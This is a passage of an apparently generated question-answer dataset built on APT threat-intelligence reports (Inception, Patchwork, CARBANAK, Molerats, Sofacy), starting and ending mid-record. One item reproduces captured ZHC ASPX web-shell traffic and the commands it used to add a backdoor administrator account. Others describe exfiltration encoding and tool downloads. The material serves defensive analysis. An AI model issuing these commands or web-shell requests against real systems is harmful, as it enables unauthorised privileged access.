interest, both of the DLLs originally had the same internal name (78wO13YrJ0cB.dll).  Presumably the same PE sanitization script and parameters were used on both.\nNone of these plugins contain any means of CnC communication. Instead, when they are executed they are passed a pointer to a function to use for sending data back home. Neither are they ever written to disk. They are executed in memory only, and once they have completed the memory is freed. This makes these modules extremely stealthy, flexible and compatible with multiple toolsets independent of what CnC method is being used.\n921.bin retrieves several datapoints about the infected machine: Domain info; a list of running processes with all loaded modules in each; the list of installed software; and a complete hardware profile of the target machine. 922.bin compiles a dirwalk \u2022 a complete listing of every file path \u2022 of each fixed drive. All of this information is exfiltrated back via the same WebDAV connection.\nThis model makes it possible to do the intrusion in steps, with verification stages in between; and the files will not be easily found on affected computers.\nBased on the information gathered from these modules, the attackers appear to move to the next stage of their attack by placing more new components on the WebDAV shares. Information about these uploads is limited by the fact that we do not have the AES keys to decrypt much of the uploaded data, but we have been able to see some upload patterns.\nWhat we assume to be third-stage plugins appear on the shares as *.bin files of roughly 72kb. As with other plugins, these are downloaded and deleted from the share in one go. However, the next day, another *.bin file of the same size will be uploaded to the share. This is a pattern that repeats itself over all live accounts. It seems that because the plugins exist in memory only, they are injected daily to ensure persistence on victim computers. Our theory is that this malware is a more typical datastealer, and we have observed that after this type of file is planted on the account, encrypted data uploads from compromised users increase.\nMedium Headline: The Sheep and the Wolves\nVictims of this attack will connect using the Windows WebDAV redirector, and the HTTP request user-agent string will reflect this. For Windows XP this will typically be \u2022Microsoft-WebDAV-MiniRedir/5.1.2600\u2022, and for Windows 7 a common user-agent is \u2022Microsoft-WebDAV-MiniRedir/6.1.7601\u2022.\nSecurity researchers \u2022 and there are a few of them - connect in a variety of ways; first of all, we see a number of connections that are indistinguishable from the way victims connect. This happens when researchers use lab machines with live internet access to run the malware. The only way we can tell these are researchers is because they connect from IP address ranges that are unlikely to be victims; and they also tend to consist of short-lived sessions.\nSome researchers set up scheduled tasks to scan the shares for new updates and malware. We see a few variations of these \u2022 one typical configuration is where the requests contain a Python-related user-agent string.\nAttackers, on the other hand, don\u2022t appear to use Windows. Common across multiple accounts, multiple IP\u2022s, and over time, is that the probable attackers have used a HTTP user-agent of \u2022davfs2/1.4.6 neon/0.29.6\u2022.\nWe know these are not researchers, because we can see malware files being uploaded by them:\nAbove: Log entry for the account white3946. We have been unable to locate the malware that uses this account.\nWe have a log fragment in which the attackers uploaded a sequential series of updates (from 1746.bin to 1774.bin) within 1.5 hours on Sept 17th , spread over 27 different accounts and using 27 different IP addresses in the process.\nThe user-agent string shows that attackers likely have used a client based on the open source davfs2 file system for Linux to mount the WebDAV shares.\nThis client is used when uploading new malware, but also when the attackers scan their shares for new victim updates, in which case the shares are enumerated by requests in a scheduled manner.\nAn attacker scans the tem5842 account for updates.\nAt intervals, scans hop to new IP addresses.\nThe attackers have used a large number of IP addresses to access the shares. As mentioned above, there is a rotation scheme in place in which a new IP address will be used after a few minutes of access against CloudMe accounts.\nThese IP\u2022s are distributed widely over geographical locations and service providers, with a heavy bias towards South Korean ranges.\nDistribution of attacker IP addresses\nAt first we thought these IP\u2022s belonged to some commercial proxy service, particularly since several such proxy services also offer IP rotation. However, this turned out to be a wrong assumption.\nBig Headline: An embedded device proxy network\nA superficial examination of the proxy IP addresses that connected to CloudMe showed them to be internet-connected devices of various kinds. Many were Korean Tera-EP home routers; but there were several other products represented.\nIt is believed that the attackers were able to compromise these devices based on poor configurations or default credentials.\nWe were able to do some forensic work on a compromised Tera-EP TE-800 device and discovered another dimension of the attacker\u2022s infrastructure.\nQ: What are the advantages of using WebDAV for the Inception framework's malware operations, and how does it aid in tracking phishing campaigns?",
    "output": "Using WebDAV provides several advantages for the Inception framework's malware operations. It allows the malware to transfer files using standard file I/O commands, making detection more difficult. Additionally, all authentication information, including URL, folders, path, username, and password, is stored in an AES-encrypted configuration structure. Each malware instance uses a unique path, username, and password, enabling attackers to uniquely identify every targeted attack and track the success of each phishing campaign.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Patchwork cyberespionage group expands targets from governments to wide range of industries\nJuly 24, 2016\nSymantec Official Blog\nSymantec finds that Patchwork now targets a variety of industries in the US, China, Japan, South East Asia, and the UK.\nBy: Symantec Employee\nCreated 25 Jul 2016\n: , , ,\nThe Patchwork attack group has been targeting more than just government-associated organizations. Our research into the group found that it's been attacking a broad range of industries\u2014including aviation, broadcasting, and finance\u2014to drop back door Trojans.\nSymantec Security Response has been actively monitoring Patchwork, also known as Dropping Elephant, which uses Chinese-themed content as bait to compromise its targets' networks. Two security companies, Cymmetria and Kaspersky, each recently released reports on the campaign, most of which are in line with our observations.\nPatchwork group widens scope to include broad range of industries in multiple regions\n\nAnswer this question based on the above context: How does the Patchwork cyberespionage group, also known as Dropping Elephant, leverage Chinese-themed content in its attacks, and what types of organizations and industries have they expanded their targeting to?",
    "output": "The Patchwork cyberespionage group, also known as Dropping Elephant, leverages Chinese-themed content as bait to compromise its targets' networks. This tactic is designed to entice victims into engaging with the malicious content, thereby facilitating the installation of backdoor Trojans. Initially, the group was primarily focused on government-associated organizations. However, recent research by Symantec Security Response indicates that Patchwork has expanded its scope to include a broad range of industries, such as aviation, broadcasting, and finance. This expansion highlights the group's evolving strategy to target diverse sectors across multiple regions, including the US, China, Japan, South East Asia, and the UK.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 4.6.2 Host Visibility and Indicators\nThis section discusses the methodology and RSA NetWitness Endpoint Instant IOCs (IIOCs) and content used by RSA IR during this investigation. The methodology used in this section is described in detail in the RSA NetWitness Endpoint User Guide found here.18\nThe CARBANAK actors involved during this engagement were particularly careful to leave as little file, log or execution traces as possible. This included, but was not limited to, ad hoc download of tools as needed, preference for lateral tool movement, log deletion automatically built into tools, immediate deletion of tools and logs upon logout of systems, and removal of entries from centralized log repositories.\nDuring this engagement, the RSA NetWitness Endpoint agent was deployed to all Red Hat Enterprise Linux (RHEL) and CentOS 6 and 7 systems, as they could support it. The detection of attacker activity on these systems within RSA NetWitness Endpoint utilized aspects of the attacker actions and toolset utilizations that deviated from legitimate installed binary usage. An example of this is the usage of the AUDITUNNEL and the SSHDOOR client and server binaries. Originally, the attackers placed the SSHDOOR binaries in /usr/bin and /usr/sbin as a replacement for the system OpenSSH client and server binaries. However, upon the remediation of system ALPHA, the attackers utilized the SSHDOOR binaries in the non-standard location of /usr/share/ man/mann. The initial placement of SSHDOOR was observed by reviewing any binaries automatically started as part of systemd or init.d, and had a hash value that didn't match the one in the RPM package list. These attributes are recorded in the IIOCs of RSA NetWitness Endpoint and are shown in the SSHDOOR detection in Figure 40.\n18 \"RSA NetWitness Endpoint User Guide\";\nOnce the attackers moved to a non-standard location, this was easily identified, as they were the only common system service binaries not running in either /sbin or /usr/sbin. The aspects of both instances of SSHDOOR use are illustrated in Figure 41.\nIn Figure 41, we observe two separate sshd binaries running on the system. As SSH only requires one instance of its service binary running at a time, this is an anomaly. Add to this the non-standard location of /usr/share/man/ mann in which the second sshd is executing, and the fact that this binary cannot be associated with a legitimately installed RPM package, this activity immediately becomes suspect and warrants investigation. The legitimate sshd service binary process is also highlighted as running from /usr/sbin.\nAnother method of identifying the attacker activity during this engagement involved the command line arguments used by the attackers. Essentially, while the attackers could change directory locations, filenames and even hashes, the base functionality of the tools themselves could not readily or easily be changed. Given that the command line arguments of the tool indicated the functionality being utilized, RSA IR analysts zeroed in on the unique command line arguments of the tools being use by the attackers. As an example, the usage of any web address or IP address in the command line arguments became immediately suspect and reviewed, as shown in Figure 42.\nAs a follow-up to these findings, RSA IR analysts utilized some of the base functions of the RSA NetWitness Endpoint agent in order to gain additional artifacts and information associated with known indicators. During this engagement, the directory /usr/share/man/mann was the primary working directory for system BRAVO. In using this indicator during scoping investigations, the file contents for /usr/share/man/mann were requested from every Linux server in the environment. The purpose of this was to determine if this directory was being maliciously used on any systems within the environment and to gain additional evidence that may not have executed during the agent's tenure on the system.\nIn requesting files for this directory across all systems, analysts are able to determine if there are additional tools or malware artifacts used by the attackers within the same directory. Additionally, this action can also determine if the binaries observed executing from this directory exist on any other systems. Both cases are shown in the results of this action from the Global Downloads section shown in Figure 44.\nThe functionality is also useful in acquiring key host artifacts, such as configuration files and host logs, across all systems within the environment and then processing and reviewing them in aggregate in order to gain more contextual information and situational awareness.\nWhile contextual forensic data within host artifacts could identify some attacker activity, much of the most commonly utilized host forensic data either was not useful or was not available on the hosts affected during this engagement. While aggregate analysis of artifacts, such as NTFS Master File Tables, AmCache, SYSTEM and SOFTWARE Registry Hives, and Windows Event Logs, could identify certain aspects of the attackers' actions, they were consistently ineffective at providing the necessary level of granularity to track the attackers' actions appropriately. However, using the RSA NetWitness Endpoint agent already present on the hosts to provide this critical host data, the aforementioned artifacts became force multipliers by providing additional context to the actions observed in RSA NetWitness Suite.\nThe attackers utilized a specific staging directory on each host in which they took any significant action. In order to appear more legitimate to security analysts and tools, they utilized the legitimate Microsoft Windows directory for 32-bit applications utilizing the Taiwan Chinese language pack on 64-bit versions of Windows, C:\\Windows\\SysWoW64\\zh-TW. While this directory is a legitimate Windows system directory, no server systems within this environment were legitimately utilizing the Taiwan Chinese language directory. As such, this became a useful and actionable IOC for scoping and tracking any systems with substantial actor activity. An example of attacker use of this directory, as observed in RSA NetWitness Endpoint, is shown in Figure 45.\nIn Figure 45 above, the usage of the UIAutomationCore.dll.bin WGET binary to download attacker tools and the immediate renaming of those tools are shown. This, again, became an excellent actionable IOC to track adversary activity. The same contextual aspects that were utilized in the network IOC for WGET usage in Figure 33 are also used here. By identifying any command executions that utilize a command line argument of 'http://' followed by an IP address, RSA IR was able to identify any and all instances in which the attackers downloaded tools. In hunting for this activity, we use the same methodology used in Section 3.3.1, identifying aspects of the activity associated with IIOCs and reviewing those IIOCs for activity. In this case, the UIAutomationCore.dll.bin WGET binary download is an unsigned module, located within a legitimate Windows directory, communicates to an external source directly to IP address and writes an executable to disk. The IIOCs shown in Figure 46 reflect this activity.\nAs stated in the section associated with Table 15, the TINYP binary is a modification of the SysInternals PSEXEC remote access utility. Just like PSEXEC, the TINYP binary sends a service binary to the ADMIN$ share (C:\\ Windows) of the target host. The target host executes this service binary, and the TINYP tool connects to that service binary. When identifying attacker lateral movement from the perspective of the target system, the PSEXESVC. exe TINYP service binary executes the remote command requested by the attacker system. The view of this activity in RSA NetWitness Endpoint is illustrated in Figure 47.\nFigure 47 illustrates the most common use case for the TINYP binary observed: lateral movement via remote command shell execution. In the figure above, the source host perspective of TINYP execution is shown in the red boxes, while the target host perspective of TINYP execution is shown in the blue boxes. In the box labeled \"1,\" we see file PSEXESVC.exe service binary being written to the C:\\Windows directory, which represents the ADMIN$ SMB/CIFS network share. Once the service binary is placed in the ADMIN$ share, a Windows Registry entry is created in the SYSTEM Registry Hive under the path HKLM\\SYSTEM\\ControlSet001\\services\\PSEXESVC. Once the service binary is placed on the system, a Windows Service is created to execute the service binary. This is observed in the last item in box \"1,\" as the Windows Services Control Manager services.exe executes the PSEXESVC.exe process.\nUpon the second execution of the TINYP binary, the Windows SYSTEM Registry Key is not created, as it already exists on the system, and it is important to note that the Registry entry is only created on the first execution. This information can be used to determine the first host access by this method. On the second execution, represented by the box labeled \"2,\" we see the Windows Local Security Authentication Server binary lsass. exe opening the PSEXESVC.exe service process. This is the actor attempting to authenticate to the remote system under whatever credentials they have acquired. Once authenticated, the process goes into the box labeled \"3,\" where the PSEXESVC.exe service binary executes the Windows Command Processor cmd.exe remotely on behalf of the attacker. It is important to note that while the calling parent binary on the target system is the TINYP binary ps.exe, all actions executed by TINYP will be carried out by the PSEXESVC. exe service binary on the target system. Given this, we can identify remote command shell execution via PSEXEC for any instance in which PSEXESVC.exe Creates Process cmd.exe, which we established was the primary use case for this tool in this engagement.\nQ: How did RSA IR leverage command line arguments to identify attacker activity, and what specific actions were taken based on these findings?",
    "output": "RSA IR analysts focused on the unique command line arguments of the tools used by the attackers, as these arguments indicated the functionality being utilized. For example, any command line arguments that included a web address or IP address became immediately suspect and were reviewed. Following these findings, RSA IR analysts used the RSA NetWitness Endpoint agent to request file contents for the directory /usr/share/man/mann from every Linux server in the environment. This helped determine if this directory was being maliciously used on any systems and to gather additional evidence that might not have executed during the agent's tenure on the system.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 14 File(s)  128,616 bytes 4 Dir(s)  26,521,387,008 bytes free\n</pre></span></p>\n---------------------------------------- TRUNCATED BY ANALYST -------------------------------------------------- <b><p align=\"center\" valign=\"bottom\" class=\"footer\">ZHC Shell 1.0&nbsp;&bull;&nbsp;2011<br/> By XXx_Death_xXX Of <a href=\"http://www.zone-hack.com\" target=\"_blank\" title=\"Welcome to ZHC SHEll\"> ZCompany Hacking Crew</a>&nbsp;&bull;&nbsp;zone-hack.com #ZHC</p></b> </body> </html>\n- \"System Information\" options selected\nGET /ZHC_Shell_1.0.aspx?action=information\nHTTP/1.1\nAccept: */*\nReferer: http://192.168.1.1/ZHC_Shell_1.0.aspx\nAccept-Language: en-us\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET4.0C)\nHost: 192.168.1.1\nConnection: Keep-Alive\nCookie: ASP.NET_SessionId=2n0ffa45celc1uac4wopi1bl\n---- RESPONSE ----\nSmall Headline: HTTP/1.1 200 OK\nServer: Microsoft-IIS/5.1\nDate: Mon, 24 Feb 2014 19:54:43 GMT\nX-Powered-By: ASP.NET\nX-AspNet-Version: 2.0.50727\nCache-Control: private\nContent-Type: text/html; charset=utf-8\nContent-Length: 3298\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html>\n<p align=\"center\"><img alt=\"\" title=\"\" src=\"http://img851.imageshack.us/img851/2304/bismillahus.jpg\" /><br />\n</p>\n---------------------------------------- TRUNCATED BY ANALYST --------------------------------------------------\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html\">\n<title>Aspx Shell By XXx_Death_xXX & ZHC</title>\n</head>\n<body>\n<td colspan=\"2\"><span class=\"style3\"><b>Client Infomation</b></span></td>\n</tr>\n<tr>\nClient Proxy\n<td></td>\n<td>None</td>\n</tr>\n<tr>\nClient IP\n<td></td>\n<td>192.168.1.100</td>\n</tr>\n<tr>\n<td>User</td>\n<td>Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET4.0C)</td>\n</tr>\n</table>\n</p>\n<script language=\"javascript\"> function closewindow()\n{self.close();}\n</script>\n<b><p align=\"center\" valign=\"bottom\" class=\"footer\">ZHC Shell 1.0&nbsp;&bull;&nbsp;2011<br/>\nBy XXx_Death_xXX Of <a href=\"http://www.zone-hack.com\" target=\"_blank\" title=\"Welcome to ZHC SHEll\"> ZCompany Hacking Crew</a>&nbsp;&bull;&nbsp;zone-hack.com #ZHC</p></b> </body>\n</html>\n- \"Add User\" option selected\nCommand: \"net user STTEAM STTEAM_PASSWORD /add\"\nGET /ZHC_Shell_1.0.aspx?action=cmd5\nHTTP/1.1\nAccept: */*\nReferer: http://192.168.1.1/ZHC_Shell_1.0.aspx\nAccept-Language: en-us\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET\nCLR 3.0.04506.648; .NET CLR 3.5.21022; .NET4.0C)\nHost: 192.168.1.1\nConnection: Keep-Alive\nCookie: ASP.NET_SessionId=2n0ffa45celc1uac4wopi1bl\n---- RESPONSE ----\nSmall Headline: HTTP/1.1 200 OK\nServer: Microsoft-IIS/5.1\nDate: Mon, 24 Feb 2014 20:15:10 GMT\nX-Powered-By: ASP.NET\nX-AspNet-Version: 2.0.50727\nCache-Control: private\nContent-Type: text/html; charset=utf-8\nContent-Length: 3294\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html>\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n<p align=\"center\"><img alt=\"\" title=\"\" src=\"http://img851.imageshack.us/img851/2304/bismillahus.jpg\" /><br />\n</p>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html\">\n<title>Aspx Shell By XXx_Death_xXX & ZHC</title>\n</head>\n<body>\n<form name=\"ctl05\" method=\"post\" action=\"ZHC_Shell_1.0.aspx?action=cmd5\" id=\"ctl05\">\n---------------------------------------- TRUNCATED BY ANALYST --------------------------------------------------\n<center><p>[ Command Prompt ]</p>\n<p>(<span class=\"style3\">Note: Please CLICK \"RUN\" in order to execute the command</span>)</p>\nCommand:\n<input name=\"cmd5\" type=\"text\" value=\"net user USERNAME PASSWORD /add\" id=\"cmd5\" class=\"TextBox\" style=\"width:300px;\" />\n<input type=\"submit\" name=\"Button1234567\" value=\"Run\" id=\"Button1234567\" class=\"button\"\n/></center> ---------------------------------------- TRUNCATED BY ANALYST --------------------------------------------------\n<b><p align=\"center\" valign=\"bottom\" class=\"footer\">ZHC Shell 1.0&nbsp;&bull;&nbsp;2011<br/> By XXx_Death_xXX Of <a href=\"http://www.zone-hack.com\" target=\"_blank\" title=\"Welcome to ZHC SHEll\"> ZCompany Hacking Crew</a>&nbsp;&bull;&nbsp;zone-hack.com #ZHC</p></b> </body> </html>\n---- REQUEST ----\nVery Small Headline: POST /ZHC_Shell_1.0.aspx?action=cmd5 HTTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/x-ms-application, application/x-ms-xbap, application/vnd.ms-xpsdocument, application/xaml+xml, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*\nReferer: http://192.168.1.1/ZHC_Shell_1.0.aspx?action=cmd5\nAccept-Language: en-us\nContent-Type: application/x-www-form-urlencoded\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET\nCLR 3.0.04506.648; .NET CLR 3.5.21022; .NET4.0C)\nHost: 192.168.1.1\nContent-Length: 391\nConnection: Keep-Alive\nCache-Control: no-cache\nCookie: ASP.NET_SessionId=2n0ffa45celc1uac4wopi1bl\n__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwULLTEzODY2ODE5 NzYPZBYCAgsPFgIeB2VuY3R5cGUFE211bHRpcGFydC9mb3JtLWRhdGFkGAEFHl9fQ29udHJv bHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYDBQdOZXdGaWxlBQxOZXdEaXJlY3RvcnkFDE5ld0Rpcm VjdG9yeVsWlNx5Na0HFMN2RRO%2BceR1t%2BaS&cmd5=net+user+STTEAM+STTEAM_PAS SWORD+%2Fadd&Button1234567=Run&__EVENTVALIDATION=%2FwEWAwLrm6SaCAKzmZ WbBQL2%2FOPuA2cTIANlM0qT3tdmPBJNeBj1930x\n- \"Add User To Administrators Group\" option selected\nCommand: \"net localgroup Administrators STTEAM /add\"\n\nHow does the 'K-Shell/ZHC Shell 1.0/Aspx Shell' backdoor allow attackers to escalate privileges within a compromised system, and what specific commands are used for this purpose?",
    "output": "A: The 'K-Shell/ZHC Shell 1.0/Aspx Shell' backdoor allows attackers to escalate privileges by adding a new user to the system and then adding that user to the Administrators group. This is achieved using specific commands. For example, to add a user named 'STTEAM' with the password 'STTEAM_PASSWORD', the command 'net user STTEAM STTEAM_PASSWORD /add' is used. To add this user to the Administrators group, the command 'net localgroup Administrators STTEAM /add' is executed. These commands are sent via HTTP requests to the backdoor script, enabling the attacker to gain administrative access to the compromised system.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does APT41's use of third-party services to target victims relate to Phishing: Spearphishing via Service, and what tactics do they employ to gain access to victim systems?",
    "output": "Phishing: Spearphishing via Service is a tactic employed by adversaries to gain access to victim systems by sending spearphishing messages via third-party services. APT41, a Chinese cyber espionage group, has been observed using this tactic to target victims. According to the #Given Context#, APT41 has compromised third-party services, such as online billing/payment services and TeamViewer, to gain access to victim systems. They have also used compromised credentials to initiate TeamViewer sessions and transfer files. This is similar to Phishing: Spearphishing via Service, where adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services to gain access to victim systems. APT41's use of third-party services to target victims is a classic example of Phishing: Spearphishing via Service, where they employ social engineering tactics to generate rapport with the target and get the target's interest in some way. By creating fake social media accounts and messaging employees for potential job opportunities, APT41 can ask about services, policies, and software that's running in an environment, and then send malicious links or attachments through these services.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Threat attribution\nWe have attributed the attack to Molerats APT group based on following observations:\n1. Use of open-source as well as commercial packers for the backdoor (ConfuserEx, Themida)\n2. Targeting middle-east region\n3. Using Dropbox API for entire C2 communication\n4. Using RAR files for backdoor delivery as well as in later stages\n5. Using other legit cloud hosting services like Google Drive to host the payloads\n6. Overlap of domain SSL Certificate thumbprint observed on current attack infrastructure with domains used by Molerats APT group in the past\n7. Overlap of Passive DNS resolution of domain observed on current attack infrastructure with the IP used by Molerats APT group in the past\nMedium Headline: # Dynamic analysis\nThe main function of the binary is the standard ConfuserEx function which is responsible for loading the runtime module \"koi'' that is stored in encrypted form using a byte array. Once the module is loaded, the main function resolves the module's entry point function using the metadata token and invokes it by providing required parameters.\nFigure 4: Code snippet loading the runtime module and invoking it's entry point function\nThe runtime module (\"koi\") on analysis is found to be a backdoor. Before calling the main function of the module, the code from within the constructor is called which creates a new thread that regularly monitors the presence of a debugger.\nOnce the debugger monitor thread is created we get the code execution flow to the main function of the module which ultimately leads to the backdoor execution. Within the main function the backdoor performs following operations:\n1. Collects the machine manufacture and machine model information using WMI which is used for execution environment checks and is later exfiltrated to C2 server.\n2. Checks if it should execute in the current execution environment.\n3. Creates a mutex with the name of executing binary.\n4. Checks if the mutex is created successfully.\n5. Determines if it is executed for the first time using the registry key value \"HKCU/Software/{name_of_executing_binary}/{name_of_executing_binary}\".\n6. If the registry key doesn't exist, the code flow goes via a mouse check function which executes the code further only if it detects a change in either of the mouse cursor coordinates. In the end, the mouse check function also creates the same registry key.\nSmall Headline: Figure 7: Encoded string\nExecuting further the backdoor collects the following information from victim machine:\n1. Machine IP address: By making a network request to \"https://api.ipify.org\"\n2. UserName: From the environment variable\n3. HostName: Using the API call Dns.GetHostName()\nThe collected information is then processed and stored inside a variable named \"UserInfo\" by performing following operations:\n1. Concatenation (IP+UserName+HostName)\n2. Base64 string encode\n3. Substitution (Substitute \"=\" with \"1\")\n4. String reverse\nNext the backdoor sends following network requests in the specified sequence using the Dropbox API and correspondingly performs any required operations:\nMedium Headline: 4. List Content:\nList the content of root directory (which is attacker controlled) and extract the following information:\na) File name of any hosted RAR archive\nb) File name of any hosted exe (Which is found to be the legitimate RAR command-line utility and is used to extract the downloaded RAR archive in case the machine doesn't already have any RAR archive supporting application)\nc) File name of any hosted pdf or doc file (Used as decoy document)\nd) File name of any non specific file type (Based on our analysis it contains the secondary Dropbox account token that is used for file exfiltration from victim machine)\nNote: The above extracted information is stored locally and is used wherever required.\nFinally, if the backdoor executed for the first time, it downloads and opens the hosted pdf or doc file and then calls two other functions where the first function creates a thread that continuously communicates with the Dropbox account to fetch and execute the C2 commands while the second function creates a thread that downloads and executes the RAR archive using the information extracted earlier.\nBig Headline: C2 infrastructure analysis\nWhile monitoring the IPs used during the current attack we observed the domain \"msupdata.com\" started to resolve to the IP 45.63.49[.]202 from 27-12-2021. We found two Historical SSL Certificates associated with this domain. Pivoting on the SSL Certificate with thumbprint \"ec5e468fbf2483cab74d13e5ff6791522fa1081b\" we found domains like \"sognostudio.com\", \"smartweb9.com\" and others which were all attributed to Molerats APT group during past attacks.\nAdditionally, the subdomain \"www.msupdata.com\" also has a Passive DNS resolution to IP 185.244.39[.]165 which is also associated with Molerats APT group in the past.\nNote: We didn't observe any activity related to the domain \"msupdata.com\" or it's subdomain \"www.msupdata.com\" until this blog release.\nMedium Headline: Account 5:\nName: pla inod\nCountry: PS (Palestine)\nEmail: palinfo.arabic@gmail[.]com\nAlso, while analyzing the exfiltrated data from Dropbox accounts we found a screenshot of the attacker machine which was likely uploaded while the attacker was testing the malware. We correlated a number of artifacts and patterns with the file names visible from the snapshot to those used during the real attack. Moreover, from the snapshot the attacker seems to be using a simple GUI application to sync with the Dropbox account and display the victims list. In the victims list, the user name \"mijda\" is also present which matches with the name of document creator \"mij daf\" for all the documents we found during this attack.\nBig Headline: Old attack chain\nAs per our analysis the old attack chain was used from 13th July 2021(Start of campaign) to 13th Dec 2021.\nFigure 9 below illustrates the old attack chain.\nFigure 9: Attack chain\nThe major difference between the new attack chain and the old attack chain is seen in the backdoor delivery. Although we are not sure how these RAR/ZIP files were delivered but considering the past attacks they were likely delivered using Phishing PDFs. Additionally, we found a minor variation in the way the backdoor extracted the primary Dropbox account token. In the old attack chain the backdoor fetched the encoded string containing the\nprimary Dropbox account token from attacker-hosted content on \"justpaste.it\". Figure 10 below shows the attacker-hosted encoded string that contains the Dropbox account token and also describes the corresponding format.\nQuestion: What specific techniques does the Molerats APT group use to exfiltrate data from the victim's machine, and how is this data processed before being sent to the C2 server?",
    "output": "Answer: The Molerats APT group exfiltrates data from the victim's machine by collecting the machine IP address, username, and hostname. This information is then processed through a series of operations: concatenation (IP + UserName + HostName), Base64 encoding, substitution ('=' with '1'), and string reversal. The backdoor then sends network requests using the Dropbox API to list the content of the root directory, which is controlled by the attacker. It extracts information such as file names of hosted RAR archives, executables, decoy documents, and secondary Dropbox account tokens. This information is stored locally and used as needed. If the backdoor is executed for the first time, it downloads and opens a decoy document, then creates threads for continuous communication with the Dropbox account to fetch and execute C2 commands, and to download and execute RAR archives.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: The Threat\nRussian President Vladimir Putin recently described the Internet as \"an invention of the CIA.\"  But the group most widely associated with his government dominates the world of industrial scale hacking.  First discovered circa 2007 using security vulnerabilities in Microsoft Windows, Sofacy has gone on to develop and launch truly enormous attacks exploiting numerous applications including Adobe's Acrobat, Microsoft Excel, and others.  Some attacks have focused on the sorts of targets that seem likely to be of interest to Russian intelligence services.  NATO, defense industry corporations, and government domains of states opposed to Russia on various issues have all been, at times, victims of Sofacy.  At other times large banks and private corporations have been hit hard by Sofacy exploits, at a cost of hundreds of millions to the victims. Sofacy's choice of targets has historically been an interesting mixture that has fueled an ongoing debate over whether the group is criminal in nature, or actually an agent of a nation-state.  Most cybersecurity analysts have concluded that the group's affiliation with the Russian government is undeniable. But there are detractors. Those who argue loudest against such assertions cite Sofacy's prolific criminal profit as evidence that they are most likely not agents of the Federal Security Service (FSB); while others suppose that the crimes committed bearing\nSofacy's unique signatures is a perfect cover behind which the Russian Government prefers to remain.\nBig Headline: The Defenders\nStarted in 2012 and staffed almost entirely by former United States Department of Defense civilians and military cyber-warriors, root9B brings a unique base of knowledge and experience to the task of securing corporate networks. This comes at a time when the demand for services is stronger than ever and increasing daily. Calling on years of collective experience in positions that placed their analysts at the tip of the cyber-spear, root9B has developed a unique approach to the problem of cyber-defense. Understanding that the present tools are failing at an alarming rate, they have developed methods and software applications which seek to augment, rather than replace, existing cyber-security defenses.  The problem is not that traditional methods do not work. It is that hackers are becoming increasingly sophisticated and able to generate new threats faster than ever before. Standard network security systems typically fail against what are known as \"zero-day threats.\"  Zero-day is a term that refers to a new kind of hacking exploit that has never been seen before, and is therefore not detected by standard virus and intrusion detection software. Typically, such threats take an alarmingly long time to detect and eliminate, often more than a year.  They were once relatively rare, because it takes a high degree of skill to develop and exploit them. The production and sale on the black market has increased exponentially in recent years, developing into a criminal industry that is placing online commerce, as well as national security, at growing risk. In the time between deployment of a zero-day and its eventual discovery and eradication, corporations can suffer enormous losses without even realizing that the threat was ever there.\nTo combat threats, root9B realized that technology is not the problem. \"Computers don't attack networks. People do,\" said root9B. You cannot build a better system to stop a determined human, you must think like the attacker and provide manned cyber defense operations as the new adaptive security posture. root9B operators and software developers designed\nand constructed proprietary methods of discovering and dealing with adversaries.  With a network defense strategy of pursuit and deterrence in mind, root9B operators conduct Active Adversary Pursuit (HUNT) operations as a tailored solution for cyber security teams. Working in concert with traditional network defense appliances that currently reside in our client's proprietary network, root9B's HUNT platform delivers a pro-active defense protection capability to identify, pursue, and mitigate cyber threats. This approach was developed by root9B in order to leverage previously existing security products with client-specific threat intelligence and proprietary capabilities that can identify sophisticated vulnerabilities, generate actionable intelligence, and install solutions with much greater speed and efficiency.\nAnswer this question: What unique approach does root9B employ to combat zero-day threats, and how does this approach differ from traditional network security systems?",
    "output": "Root9B employs a unique approach called Active Adversary Pursuit (HUNT) to combat zero-day threats. This approach focuses on manned cyber defense operations, recognizing that people, not computers, are the attackers. By thinking like the attacker and providing pro-active defense, root9B aims to identify, pursue, and mitigate cyber threats. This differs from traditional network security systems, which often fail against zero-day threats due to their reliance on known signatures and slower response times. Root9B's HUNT platform leverages existing security products with client-specific threat intelligence and proprietary capabilities to generate actionable intelligence and implement solutions more quickly and efficiently.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
